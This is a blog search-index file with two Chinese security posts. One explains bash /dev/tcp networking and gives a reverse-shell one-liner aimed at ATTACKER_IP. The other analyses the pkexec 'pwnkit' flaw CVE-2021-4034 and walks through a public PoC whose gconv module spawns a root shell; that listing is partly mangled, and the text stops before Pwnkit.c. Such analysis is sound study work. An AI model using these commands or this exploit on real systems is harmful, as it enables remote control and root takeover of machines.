<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>/dev/tcp/...文件分析</title>
    <link href="/2025/06/24/dev-tcp-%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    <url>/2025/06/24/dev-tcp-%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>在 Linux&#x2F;Unix 的世界里，&quot;一切皆文件&quot; (Everything is a file)。这个哲学思想意味着你可以用相同的命令和操作（如 <code>cat</code>, <code>echo</code>, <code>read</code>, 重定向 <code>&lt;</code> 和 <code>&gt;</code>) 来处理不同类型的 I&#x2F;O，无论是真正的文件、硬件设备还是进程。</p><p><code>/dev/tcp/...</code> 这个特性正是这种思想的延伸。<code>bash</code> 让你能够将一个 TCP 网络连接<strong>伪装</strong>成一个文件描述符。当你尝试对这个“文件”进行读或写操作时，<code>bash</code> 会在后台为你完成以下工作：</p><ol><li>创建一个 TCP 套接字（Socket）。</li><li>根据你提供的 <code>ip</code> 和 <code>port</code> 发起一个网络连接。</li><li>将这个连接与一个文件描述符关联起来。</li></ol><p>这样，你就可以<mark>用最基础的 Shell 命令来实现网络通信</mark>，而<strong>无需调用外部程序</strong>，如 <code>netcat (nc)</code>、<code>telnet</code> 或 <code>curl</code>。</p><p>这个功能的核心是<strong>重定向 (Redirection)</strong>。</p><h2 id="端口扫描-探测"><a href="#端口扫描-探测" class="headerlink" title="端口扫描&#x2F;探测"></a>端口扫描&#x2F;探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 尝试连接到 www.google.com 的 80 端口</span><br>(<span class="hljs-built_in">echo</span> &gt; /dev/tcp/www.google.com/80) &amp;&gt;/dev/null<br></code></pre></td></tr></table></figure><p>dev_tcp_scan.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>HOST=<span class="hljs-string">&quot;www.baidu.com&quot;</span><br>PORT=<span class="hljs-string">&quot;80&quot;</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;正在检查主机 <span class="hljs-variable">$HOST</span> 的端口 <span class="hljs-variable">$PORT</span>...&quot;</span><br><br><span class="hljs-comment"># 超时设置（可选，但推荐）</span><br><span class="hljs-built_in">timeout</span> 1 bash -c <span class="hljs-string">&quot;(echo &gt; /dev/tcp/<span class="hljs-variable">$HOST</span>/<span class="hljs-variable">$PORT</span>) &amp;&gt;/dev/null&quot;</span><br><br><span class="hljs-keyword">if</span> [ $? -eq 0 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;成功：端口 <span class="hljs-variable">$PORT</span> 是开放的。&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;失败：端口 <span class="hljs-variable">$PORT</span> 是关闭的或主机不可达。&quot;</span><br><span class="hljs-keyword">fi</span><br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌───(c0r3dump@MacBook-Air)-[~/Works/tempdir]<br>└─$ ./dev_tcp_scan.sh<br>正在检查主机 www.google.com 的端口 80...<br>失败：端口 80 是关闭的或主机不可达。<br>┌───(c0r3dump@MacBook-Air)-[~/Works/tempdir]<br>└─$ ./dev_tcp_scan.sh<br>正在检查主机 www.baidu.com 的端口 80...<br>成功：端口 80 是开放的。<br></code></pre></td></tr></table></figure><h2 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># 使用 exec 将文件描述符3与一个到 a.cn 的80端口的TCP连接关联</span><br><span class="hljs-comment"># &lt;&gt; 表示可读可写</span><br><span class="hljs-built_in">exec</span> 3&lt;&gt;/dev/tcp/cn.bing.com/80<br><br><span class="hljs-comment"># 通过文件描述符3发送一个 HTTP GET 请求</span><br><span class="hljs-comment"># -e 让 echo 能够解析 \n 换行符</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;GET / HTTP/1.1\nHost: cn.bing.com\n\n&quot;</span> &gt;&amp;3<br><br><span class="hljs-comment"># 从文件描述符3读取并打印服务器的响应</span><br><span class="hljs-built_in">cat</span> &lt;&amp;3<br><br><span class="hljs-comment"># 关闭文件描述符</span><br><span class="hljs-built_in">exec</span> 3&lt;&amp;-<br><br></code></pre></td></tr></table></figure><p><img src="./image-20250624204251531.png" alt="image-20250624204251531"></p><h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h2><ul><li><a href="https://www.ddosi.org/reverse-shell/#Bash%E5%8F%8D%E5%90%91Shell">反向shell备忘单|Reverse Shell Cheat Sheet - 🔰雨苁ℒ🔰</a></li></ul><p>为了绕过防火墙的限制，反向 Shell 应运而生。它把连接的方向完全颠倒了过来。</p><ol><li><strong>攻击者机器 (服务器端)</strong>：在自己的公网服务器上运行一个程序，监听在某个端口上（比如 <code>4444</code>），等待“猎物”上钩。</li><li><strong>受害者机器 (客户端)</strong>：主动执行一个命令，<strong>从内部发起连接</strong>，去连接攻击者机器的 <code>IP:4444</code>。</li><li>一旦连接成功，受害者机器就把本地的 Shell（<code>/bin/bash</code>）的输入输出，全部交给了这个主动建立的连接。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># -i 交互式</span><br><span class="hljs-comment"># &gt;&amp; 重定向，stdout stderr定向到/dev/tcp/ATTACKER_IP/PORT</span><br><span class="hljs-comment"># 0&gt;&amp;1 stdin定向到/dev/tcp/ATTACKER_IP/PORT中</span><br>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/PORT 0&gt;&amp;1<br><br></code></pre></td></tr></table></figure><p><img src="./image-20250624210840315.png" alt="image-20250624210840315"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux提权cve-2021-4034漏洞分析</title>
    <link href="/2025/02/19/Linux%E6%8F%90%E6%9D%83cve-2021-4034%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2025/02/19/Linux%E6%8F%90%E6%9D%83cve-2021-4034%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>Qualys发现了<code>polkit&#39;s pkexec</code>中存在的一个本地提权漏洞，polkit是一个SUID-root程序，被默认安装在大多数的Linux发行版中。</p><blockquote><p><strong>Polkit</strong>（以前称为 <strong>PolicyKit</strong>）是一个用于在类 Unix 操作系统中定义和管理权限的工具包。它提供了一种灵活且细粒度的方式，允许非特权进程执行通常需要 root（管理员）权限的操作。Polkit 在 Linux 系统中广泛使用，用于让普通用户或进程执行需要特权的操作，而无需直接赋予完整的 root 权限。</p><p><strong>pkexec</strong> 是 Polkit 提供的一个命令行工具，允许普通用户以另一个用户（通常是 root）的身份执行命令，并通过 Polkit 进行授权。它是 Polkit 框架的一部分，旨在提供一种安全的方式来执行需要特权的操作，而无需直接切换到 root 用户或使用 <code>sudo</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">pkexec is a sudo-like, SUID-root program, described as follows by its<br>man page:<br><br>------------------------------------------------------------------------<br>NAME<br>       pkexec - Execute a <span class="hljs-built_in">command</span> as another user<br><br>SYNOPSIS<br>       pkexec [--version] [--disable-internal-agent] [--<span class="hljs-built_in">help</span>]<br><br>       pkexec [--user username] PROGRAM [ARGUMENTS...]<br><br>DESCRIPTION<br>       pkexec allows an authorized user to execute PROGRAM as another<br>       user. If PROGRAM is not specified, the default shell will be run.<br>       If username is not specified, <span class="hljs-keyword">then</span> the program will be executed<br>       as the administrative super user, root.<br></code></pre></td></tr></table></figure></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>main()函数内存布局</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">栈顶（低地址）<br>+-------------------+<br>| argc              |  // 参数数量<br>+-------------------+<br>| argv[0]           |  // 指向程序名称的指针<br>| argv[1]           |  // 指向第一个参数的指针<br>| ...               |<br>| argv[argc-1]      |  // 指向最后一个参数的指针<br>| NULL              |  // argv数组的结束标志<br>+-------------------+<br>| envp[0]           |  // 指向第一个环境变量的指针<br>| envp[1]           |  // 指向第二个环境变量的指针<br>| ...               |<br>| NULL              |  // envp数组的结束标志<br>+-------------------+<br>| 参数字符串         |  // 例如 <span class="hljs-string">&quot;program_name&quot;</span>, <span class="hljs-string">&quot;arg1&quot;</span>, <span class="hljs-string">&quot;arg2&quot;</span><br>| 环境变量字符串     |  // 例如 <span class="hljs-string">&quot;PATH=/usr/bin&quot;</span>, <span class="hljs-string">&quot;HOME=/home/user&quot;</span><br>+-------------------+<br>栈底（高地址）<br></code></pre></td></tr></table></figure><p>pkexec&#39;s main()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ...</span><br><span class="hljs-comment">// 534   for (n = 1; n &lt; (guint) argc; n++)</span><br><span class="hljs-comment">//  535     &#123;</span><br><span class="hljs-comment">//  ...</span><br><span class="hljs-comment">// 568     &#125;</span><br>  g_assert (argv[argc] == <span class="hljs-literal">NULL</span>);<br>  path = g_strdup (argv[n]);<br><span class="hljs-comment">// ...</span><br><br><span class="hljs-comment">// 修改envp</span><br>  <span class="hljs-keyword">if</span> (path[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;/&#x27;</span>)<br>    &#123;<br>      <span class="hljs-comment">/* g_find_program_in_path() is not suspectible to attacks via the environment */</span><br>      s = g_find_program_in_path (path);<br>      <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>          g_printerr (<span class="hljs-string">&quot;Cannot run program %s: %s\n&quot;</span>, path, strerror (ENOENT));<br>          <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>      g_free (path);<br>      argv[n] = path = s;<br>    &#125;<br><br><span class="hljs-comment">//  657   for (n = 0; environment_variables_to_save[n] != NULL; n++)</span><br><span class="hljs-comment">//  658     &#123;</span><br><span class="hljs-comment">//  659       const gchar *key = environment_variables_to_save[n];</span><br><span class="hljs-comment">//  ...</span><br><span class="hljs-comment">//  662       value = g_getenv (key);</span><br><span class="hljs-comment">//  ...</span><br><span class="hljs-comment">//  670       if (!validate_environment_variable (key, value))</span><br><span class="hljs-comment">//  ...</span><br><span class="hljs-comment">//  675     &#125;</span><br><span class="hljs-comment">//  ...</span><br><span class="hljs-comment">// 702   if (clearenv () != 0)</span><br></code></pre></td></tr></table></figure><blockquote><ul><li><code>g_find_program_in_path</code> 是 GLib 库中的一个函数，用于在系统的 PATH 环境变量中查找可执行文件的绝对路径。如果 <code>path</code> 不是绝对路径（即不以 <code>/</code> 开头），<code>g_find_program_in_path()</code> 会在 <code>PATH</code> 环境变量指定的目录中搜索名为 <code>path</code> 的可执行文件。</li><li><code>envp</code> 数组包含了当前进程的环境变量，每个元素是一个以 <code>key=value</code> 格式存储的字符串。</li></ul></blockquote><p>可以看到</p><ul><li><code>path = g_strdup (argv[n]);</code>，path来自于<code>argv[n]</code></li><li>n从1开始初始化，如果argc &#x3D; 0，n就为1，path &#x3D; argv[1]，造成了越界读（此时argv[] &#x3D; {NULL}，即path &#x3D; argv[1] &#x3D; envp[0]）</li><li>而<code>argv[1] = path = s</code>又造成了越界写，将envp[0]篡改了</li></ul><p>如上就是我们的漏洞利用原语：oob read &amp;&amp; oob write</p><h3 id="如何触发"><a href="#如何触发" class="headerlink" title="如何触发"></a>如何触发</h3><p>从上面的漏洞利用原语，更进一步可以知道</p><ul><li>如果环境变量<code>PATH=name</code>，并且<code>name</code>目录存在的话，那么就会去在name目录下去搜索名为<code>argv[1]/envp[0]</code>的可执行文件</li><li>此时<code>name/value</code>就会覆盖<code>envp[0]</code>（即可以重新引入不安全的环境变量，如下。这些环境变量默认被ld.so移除了）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">/* Environment variable to be removed <span class="hljs-keyword">for</span> SUID programs.  The names are<br>   all stuffed <span class="hljs-keyword">in</span> a single string <span class="hljs-built_in">which</span> means they have to be terminated<br>   with a <span class="hljs-string">&#x27;\0&#x27;</span> explicitly.  */<br><span class="hljs-comment">#define UNSECURE_ENVVARS \</span><br>  <span class="hljs-string">&quot;GCONV_PATH\0&quot;</span>                                                              \<br>  <span class="hljs-string">&quot;GETCONF_DIR\0&quot;</span>                                                             \<br>  <span class="hljs-string">&quot;GLIBC_TUNABLES\0&quot;</span>                                                          \<br>  <span class="hljs-string">&quot;HOSTALIASES\0&quot;</span>                                                             \<br>  <span class="hljs-string">&quot;LD_AUDIT\0&quot;</span>                                                                \<br>  <span class="hljs-string">&quot;LD_BIND_NOT\0&quot;</span>                                                             \<br>  <span class="hljs-string">&quot;LD_BIND_NOW\0&quot;</span>                                                             \<br>  <span class="hljs-string">&quot;LD_DEBUG\0&quot;</span>                                                                \<br>  <span class="hljs-string">&quot;LD_DEBUG_OUTPUT\0&quot;</span>                                                         \<br>  <span class="hljs-string">&quot;LD_DYNAMIC_WEAK\0&quot;</span>                                                         \<br>  <span class="hljs-string">&quot;LD_HWCAP_MASK\0&quot;</span>                                                           \<br>  <span class="hljs-string">&quot;LD_LIBRARY_PATH\0&quot;</span>                                                         \<br>  <span class="hljs-string">&quot;LD_ORIGIN_PATH\0&quot;</span>                                                          \<br>  <span class="hljs-string">&quot;LD_PRELOAD\0&quot;</span>                                                              \<br>  <span class="hljs-string">&quot;LD_PROFILE\0&quot;</span>                                                              \<br>  <span class="hljs-string">&quot;LD_SHOW_AUXV\0&quot;</span>                                                            \<br>  <span class="hljs-string">&quot;LD_VERBOSE\0&quot;</span>                                                              \<br><br></code></pre></td></tr></table></figure><h3 id="引入危险的环境变量"><a href="#引入危险的环境变量" class="headerlink" title="引入危险的环境变量"></a>引入危险的环境变量</h3><p>在<code>if(clearenv() != 0</code>中，会清除所有的环境变量。所以就需要可以找到触发的时机，到底引入哪一个环境变量就很重要。在<code>clearenv()</code>之前，观察到了如下操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">------------------------------------------------------------------------<br>  88 log_message (gint     level,<br>  89              gboolean print_to_stderr,<br>  90              const    gchar *format,<br>  91              ...)<br>  92 &#123;<br> ...<br> 125   <span class="hljs-keyword">if</span> (print_to_stderr)<br> 126     g_printerr (<span class="hljs-string">&quot;%s\n&quot;</span>, s);<br>------------------------------------------------------------------------<br> 383 validate_environment_variable (const gchar *key,<br> 384                                const gchar *value)<br> 385 &#123;<br> ...<br> 406           log_message (LOG_CRIT, TRUE,<br> 407                        <span class="hljs-string">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);<br> 408           g_printerr (<span class="hljs-string">&quot;\n&quot;</span><br> 409                       <span class="hljs-string">&quot;This incident has been reported.\n&quot;</span>);<br>------------------------------------------------------------------------<br></code></pre></td></tr></table></figure><p>g_printerr 的关键</p><ul><li>默认情况下会打印<code>UTF-8</code>的错误消息类型</li><li>如果不是<code>UTF-8</code>类型，那么会调用<code>iconv_open()</code>进行字符集转换<ul><li><code>iconv_open()</code>会执行一个so库，该配置文件路径可以由<code>GCONV_PATH</code>进行定义，默认配置文件路径为<code>/usr/lib/gconv/gconv-modules</code></li></ul></li></ul><blockquote><p><code>g_printerr</code> 函数是 GLib 库中的一个函数，用于打印错误信息到标准错误输出 (<code>stderr</code>)。GLib 是一个底层的通用库，提供了许多有用的数据结构和函数，广 泛用于 GNOME 项目和其他 Linux 应用程序。</p><p><code>gconv</code> 是 GNU 字符集转换库，它提供了一组函数，用于在不同的字符集之间进行转换。当程序需要进行字符集转换时，它会调用 <code>gconv</code> 库中的函数。<code>gconv</code> 库会根据 <code>CHARSET</code> 环境变量来确定当前系统的字符集，并根据需要加载相应的字符集转换模块。</p><p><strong>GCONV_PATH 的作用</strong></p><ul><li><code>GCONV_PATH</code>环境变量用于指定<code>gconv</code>库搜索字符集转换模块的路径。当<code>gconv</code>需要加载某个字符集转换模块时，它会按照<code>GCONV_PATH</code>中指定的路径顺序搜索</li></ul><p><code>gconv-modules</code>文件的每一行定义一个字符集转换模块，其格式如下：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">module</span> &lt;源字符集&gt; // &lt;目标字符集&gt; // &lt;模块名称&gt; &lt;优先级&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>源字符集</code>：需要转换的字符集。</li><li><code>目标字符集</code>：转换后的字符集。</li><li><code>模块名称</code>：实现转换的模块名称（不包含<code>.so</code>后缀）。</li><li><code>优先级</code>：模块的优先级，数字越大优先级越高。</li></ul></blockquote><p>终于我们可以使用<code>GCONV_PATH</code>该环境变量进行控制流劫持</p><h3 id="控制流劫持"><a href="#控制流劫持" class="headerlink" title="控制流劫持"></a>控制流劫持</h3><p>此时就要寻找可以触发<code>g_printerr</code>的位置，在639行被越界写以及702行<code>clearenv()</code>前进行寻找</p><ul><li>validate_environment_variable()函数，这里设置一个不在<code>/etc/shells</code>中的变量即可触发。例如<code>SHELL=c0r3dump</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 665</span><br><span class="hljs-comment">/* To qualify for the paranoia goldstar - we validate the value of each</span><br><span class="hljs-comment">       * environment variable passed through - this is to attempt to avoid</span><br><span class="hljs-comment">       * exploits in (potentially broken) programs launched via pkexec(1).</span><br><span class="hljs-comment">       */</span><br>      <span class="hljs-keyword">if</span> (!validate_environment_variable (key, value))<br>        <span class="hljs-keyword">goto</span> out;<br><br>      g_ptr_array_add (saved_env, g_strdup (key));<br>      g_ptr_array_add (saved_env, g_strdup (value));<br>    &#125;<br><br><span class="hljs-type">static</span> gboolean<br><span class="hljs-title function_">validate_environment_variable</span> <span class="hljs-params">(<span class="hljs-type">const</span> gchar *key,</span><br><span class="hljs-params">                               <span class="hljs-type">const</span> gchar *value)</span><br>&#123;<br>  gboolean ret;<br><br>  <span class="hljs-comment">/* Generally we bail if any environment variable value contains</span><br><span class="hljs-comment">   *</span><br><span class="hljs-comment">   *   - &#x27;/&#x27; characters</span><br><span class="hljs-comment">   *   - &#x27;%&#x27; characters</span><br><span class="hljs-comment">   *   - &#x27;..&#x27; substrings</span><br><span class="hljs-comment">   */</span><br><br>  g_return_val_if_fail (key != <span class="hljs-literal">NULL</span>, FALSE);<br>  g_return_val_if_fail (value != <span class="hljs-literal">NULL</span>, FALSE);<br><br>  ret = FALSE;<br><br>  <span class="hljs-comment">/* special case $SHELL */</span><br>  <span class="hljs-keyword">if</span> (g_strcmp0 (key, <span class="hljs-string">&quot;SHELL&quot;</span>) == <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-comment">/* check if it&#x27;s in /etc/shells */</span><br>      <span class="hljs-keyword">if</span> (!is_valid_shell (value))<br>        &#123;<br>          log_message (LOG_CRIT, TRUE,<br>                       <span class="hljs-string">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);<br>          g_printerr (<span class="hljs-string">&quot;\n&quot;</span><br>                      <span class="hljs-string">&quot;This incident has been reported.\n&quot;</span>);<br>          <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((g_strcmp0 (key, <span class="hljs-string">&quot;XAUTHORITY&quot;</span>) != <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">strstr</span> (value, <span class="hljs-string">&quot;/&quot;</span>) != <span class="hljs-literal">NULL</span>) ||<br>           <span class="hljs-built_in">strstr</span> (value, <span class="hljs-string">&quot;%&quot;</span>) != <span class="hljs-literal">NULL</span> ||<br>           <span class="hljs-built_in">strstr</span> (value, <span class="hljs-string">&quot;..&quot;</span>) != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      log_message (LOG_CRIT, TRUE,<br>                   <span class="hljs-string">&quot;The value for environment variable %s contains suscipious content&quot;</span>,<br>                   key);<br>      g_printerr (<span class="hljs-string">&quot;\n&quot;</span><br>                  <span class="hljs-string">&quot;This incident has been reported.\n&quot;</span>);<br>      <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>  ret = TRUE;<br><br> out:<br>  <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="PoC分析"><a href="#PoC分析" class="headerlink" title="PoC分析"></a>PoC分析</h2><ul><li><a href="https://github.com/PwnFunction/CVE-2021-4034/tree/main">PwnFunction&#x2F;CVE-2021-4034: Proof of concept for pwnkit vulnerability</a></li></ul><p>Makefile过程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 移除目录，文件</span><br><span class="hljs-built_in">rm</span> -rf <span class="hljs-string">&#x27;GCONV_PATH=.&#x27;</span> pwn pwnkit<br><br><span class="hljs-comment"># 创建文件夹GCONV_PATH,以及目录下的文件pwn</span><br><span class="hljs-built_in">mkdir</span> <span class="hljs-string">&#x27;GCONV_PATH=.&#x27;</span><br><span class="hljs-built_in">touch</span> GCONV_PATH=.\/pwn<br><span class="hljs-built_in">chmod</span> +x GCONV_PATH=.\/pwn<br><br><span class="hljs-comment"># 创建pwn目录，以及gconv的配置文件gconv-modules</span><br><span class="hljs-built_in">mkdir</span> pwn<br><br><span class="hljs-comment"># 定义转换字符集BRUH以及转换模块名称conversion-mod</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;module  UTF-8//    BRUH//    conversion-mod   1&#x27;</span> &gt; pwn/gconv-modules<br><span class="hljs-comment"># 生成共享库</span><br>gcc -shared -fPIC -o pwn/conversion-mod.so conversion-mod.c<br>gcc -o pwnkit pwnkit.c<br></code></pre></td></tr></table></figure><p>Conversion-mod.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// conversion-mod.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> \_GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;gconv.h&gt;</span></span><br><br><span class="hljs-comment">// gconv模块初始化函数，模块被加载时，gconv*init函数会被自动调用</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">gconv_init</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-comment">/* Get back uid &amp; gid \_/</span><br><span class="hljs-comment">setuid(0);</span><br><span class="hljs-comment">setgid(0);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    char *args[] = &#123;&quot;sh&quot;, NULL&#125;;</span><br><span class="hljs-comment">    char *envp[] = &#123;&quot;PATH=/bin:/usr/bin:/sbin&quot;, NULL&#125;;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">// 启动一个shell</span><br><span class="hljs-comment">execvpe(&quot;/bin/sh&quot;, args, envp);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    return(__GCONV_OK);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">int gconv()&#123; return(\_\_GCONV_OK); &#125;</span><br></code></pre></td></tr></table></figure><p>Pwnkit.c</p><figure class="highlight c"><table><tr><td 